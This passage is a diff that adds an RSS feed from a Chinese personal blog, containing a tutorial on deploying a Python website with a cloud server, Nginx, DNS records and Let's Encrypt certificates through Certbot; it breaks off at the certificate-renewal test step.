@@ -1,0 +1,805 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>SnowRoll Blog • Posts by &#34;linux&#34; tag</title>
+        <link>https://snowroll.github.io</link>
+        <description>分享经验，记录生活</description>
+        <language>zh-CN</language>
+        <pubDate>Wed, 18 Nov 2026 02:00:00 +0000</pubDate>
+        <lastBuildDate>Wed, 18 Nov 2026 02:00:00 +0000</lastBuildDate>
+        <category>python</category>
+        <category>codeql</category>
+        <category>crypto</category>
+        <category>Line By Line</category>
+        <category>paper</category>
+        <category>basketball</category>
+        <category>read</category>
+        <category>linux</category>
+        <category>shell</category>
+        <category>chatgpt</category>
+        <category>crawler</category>
+        <category>dockerß</category>
+        <category>email</category>
+        <category>github page</category>
+        <category>gitlab</category>
+        <category>heartbeat, java</category>
+        <category>latex</category>
+        <category>markdown</category>
+        <category>mongodb</category>
+        <category>photograph</category>
+        <category>powershell</category>
+        <category>reverse-shell</category>
+        <category>mail</category>
+        <category>except</category>
+        <category>java</category>
+        <category>travel</category>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/build-website/</guid>
+            <title>如何从零搭建并部署一个网站</title>
+            <link>https://snowroll.github.io/build-website/</link>
+            <category>linux</category>
+            <category>shell</category>
+            <pubDate>Wed, 18 Nov 2026 02:00:00 +0000</pubDate>
+            <description><![CDATA[ &lt;p&gt;本文记录从零开始搭建并部署一个网站的完整流程。以 Python 网站为例，使用 Codex 生成网站代码，通过云服务器部署网站，使用域名访问，最后通过 Nginx 配置反向代理，并使用 Let’s Encrypt 提供的 Certbot 配置 HTTPS。&lt;/p&gt;
+&lt;p&gt;整个流程可以分为四个阶段：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;创建网站：使用 Codex 生成网站代码及相关资源。&lt;/li&gt;
+&lt;li&gt;购买服务器：准备运行环境，安装 Python、Nginx 等软件。&lt;/li&gt;
+&lt;li&gt;购买域名：配置 DNS 解析，申请 SSL/TLS 证书。&lt;/li&gt;
+&lt;li&gt;网站部署：上传网站文件，配置 Nginx，启动服务并验证网站。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;创建网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建网站&#34;&gt;#&lt;/a&gt; 创建网站&lt;/h2&gt;
+&lt;p&gt;首先需要准备网站本身。可以使用 Codex 辅助生成网站代码、页面布局、图片、CSS、JavaScript 以及后端服务脚本。&lt;/p&gt;
+&lt;h3 id=&#34;使用-codex-生成网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用-codex-生成网站&#34;&gt;#&lt;/a&gt; 使用 Codex 生成网站&lt;/h3&gt;
+&lt;p&gt;向 Codex 提供网站的功能需求和设计要求，让其生成完整的网站项目。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;网站需要实现什么功能。&lt;/li&gt;
+&lt;li&gt;网站需要包含哪些页面。&lt;/li&gt;
+&lt;li&gt;…&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对于简单的静态网站，可以直接生成 HTML、CSS 和 JavaScript 文件。&lt;/p&gt;
+&lt;p&gt;对于需要后端服务的网站，可以使用 Python Flask、FastAPI 等框架。&lt;/p&gt;
+&lt;h3 id=&#34;确定网站目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定网站目录&#34;&gt;#&lt;/a&gt; 确定网站目录&lt;/h3&gt;
+&lt;p&gt;例如，将网站项目放在：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/var/www/mywebsite/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;目录结构可以设计为：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mywebsite/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── server.py              # 网站启动脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── requirements.txt       # Python 依赖&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── templates/             # HTML 页面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│   └── index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── static/                # 静态资源&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│   ├── css/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│   ├── js/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│   └── images/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└── README.md&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;确定启动命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定启动命令&#34;&gt;#&lt;/a&gt; 确定启动命令&lt;/h3&gt;
+&lt;p&gt;要求 Codex 在生成项目时，同时提供明确的启动命令。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 server.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;开发阶段可以直接运行该命令进行测试。&lt;/p&gt;
+&lt;p&gt;正式部署时，建议使用 Gunicorn 或 Uvicorn 等生产级服务器运行 Python Web 应用，而不是直接使用 Flask 或其他框架自带的开发服务器。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;购买服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#购买服务器&#34;&gt;#&lt;/a&gt; 购买服务器&lt;/h2&gt;
+&lt;p&gt;网站代码准备完成后，需要购买一台云服务器，用于部署和运行网站。&lt;/p&gt;
+&lt;h3 id=&#34;选择服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#选择服务器&#34;&gt;#&lt;/a&gt; 选择服务器&lt;/h3&gt;
+&lt;p&gt;常见的云服务器提供商：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;阿里云：国内服务器，适合面向国内用户的网站。&lt;/li&gt;
+&lt;li&gt;搬瓦工（BandwagonHost）：海外 VPS，适合部署面向海外用户的网站。&lt;/li&gt;
+&lt;li&gt;其他选择：腾讯云、华为云、AWS、DigitalOcean 等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对于简单的个人博客或展示型网站，通常可以从 1 核 CPU、1GB～2GB 内存的服务器开始。&lt;/p&gt;
+&lt;h3 id=&#34;连接服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#连接服务器&#34;&gt;#&lt;/a&gt; 连接服务器&lt;/h3&gt;
+&lt;p&gt;购买服务器后，通常会获得：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;公网 IP 地址。&lt;/li&gt;
+&lt;li&gt;SSH 登录用户名。&lt;/li&gt;
+&lt;li&gt;SSH 密码或密钥。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;通过 SSH 登录服务器：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh root@服务器公网IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果使用指定私钥：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh -i ~/.ssh/id_rsa root@服务器公网IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;更新系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;登录服务器后，首先更新 Ubuntu 软件包：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt upgrade -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;安装网站运行环境&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以 Python 网站为例，安装 Python、pip、虚拟环境和 Nginx：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install -y \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    python3 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    python3-pip \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    python3-venv \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nginx \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看 Python 版本：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果项目要求 Python 3.11，可以安装对应版本：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install -y python3.11 python3.11-venv python3.11-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果当前 Ubuntu 软件源没有提供 Python 3.11，可以根据 Ubuntu 版本添加 Deadsnakes PPA。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2.5 安装项目依赖&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;创建网站目录：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo mkdir -p /var/www/mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;建议为网站创建独立的运行用户，避免直接使用 root 运行网站：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo useradd --system --create-home \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --home-dir /var/www/mywebsite \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --shell /usr/sbin/nologin website&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;后续需要根据实际情况配置目录权限。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;购买域名及配置-https&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#购买域名及配置-https&#34;&gt;#&lt;/a&gt; 购买域名及配置 HTTPS&lt;/h2&gt;
+&lt;p&gt;网站部署完成后，需要通过域名访问，而不是直接通过服务器 IP 地址访问。&lt;/p&gt;
+&lt;h3 id=&#34;购买域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#购买域名&#34;&gt;#&lt;/a&gt; 购买域名&lt;/h3&gt;
+&lt;p&gt;可以在阿里云等域名注册商购买域名。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;购买完成后，需要配置 DNS 解析。&lt;/p&gt;
+&lt;h3 id=&#34;配置-dns-解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置-dns-解析&#34;&gt;#&lt;/a&gt; 配置 DNS 解析&lt;/h3&gt;
+&lt;p&gt;进入域名管理控制台，找到 DNS 解析设置，添加以下记录：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;主机记录&lt;/th&gt;
+&lt;th&gt;记录类型&lt;/th&gt;
+&lt;th&gt;记录值&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;@&lt;/td&gt;
+&lt;td&gt;A&lt;/td&gt;
+&lt;td&gt;服务器公网 IP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;www&lt;/td&gt;
+&lt;td&gt;A&lt;/td&gt;
+&lt;td&gt;服务器公网 IP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@&lt;/code&gt;  表示根域名，例如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;www&lt;/code&gt;  表示 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;www.example.com&lt;/span&gt;。&lt;/li&gt;
+&lt;li&gt;A 记录用于将域名解析到 IPv4 地址。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;配置完成后，可以使用以下命令检查解析结果：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dig example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dig www.example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;也可以使用：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nslookup example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;确保两个域名都解析到了正确的服务器 IP。&lt;/p&gt;
+&lt;h3 id=&#34;申请-ssltls-证书&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#申请-ssltls-证书&#34;&gt;#&lt;/a&gt; 申请 SSL/TLS 证书&lt;/h3&gt;
+&lt;p&gt;为了支持 HTTPS 访问，需要为域名申请 SSL/TLS 证书。&lt;/p&gt;
+&lt;p&gt;这里使用 Let’s Encrypt 提供的免费证书服务，通过 Certbot 自动申请和配置证书。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;安装 Certbot&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;推荐在 Ubuntu 上使用 Snap 安装：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install snapd -y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo snap install --classic certbot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ln -s /snap/bin/certbot /usr/bin/certbot&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;检查安装结果：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certbot --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;使用 Certbot 申请证书&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;确保：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;域名已经解析到服务器公网 IP。&lt;/li&gt;
+&lt;li&gt;服务器的 80 和 443 端口可以从公网访问。&lt;/li&gt;
+&lt;li&gt;Nginx 已安装并正常运行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo certbot --nginx \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -d example.com \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -d www.example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--nginx&lt;/code&gt;  表示使用 Nginx 插件自动完成验证，并尝试修改 Nginx 配置。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;  用于指定需要申请证书的域名。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;申请成功后，Certbot 通常会自动配置 Nginx，使网站支持 HTTPS。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查看证书路径&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo certbot certificates&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;默认情况下，证书保存在：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/etc/letsencrypt/live/example.com/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;主要文件：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cert.pem       # 域名证书&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chain.pem      # 中间证书&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fullchain.pem  # 完整证书链&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privkey.pem    # 私钥&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Nginx 配置中通常使用：&lt;/p&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;ssl_certificate&lt;/span&gt;     /etc/letsencrypt/live/example.com/fullchain.pem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;ssl_certificate_key&lt;/span&gt; /etc/letsencrypt/live/example.com/privkey.pem;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：不要将私钥文件  &lt;code&gt;privkey.pem&lt;/code&gt;  暴露给公众，也不要直接修改  &lt;code&gt;/etc/letsencrypt/live/&lt;/code&gt;  下的证书文件。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;配置自动续期&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Let’s Encrypt 证书有效期为 90 天，需要定期续期。&lt;/p&gt;
+&lt;p&gt;Certbot 安装后通常会自动配置续期定时任务，可以检查：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;systemctl list-timers | grep certbot&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;测试自动续期：&lt;/p&gt;
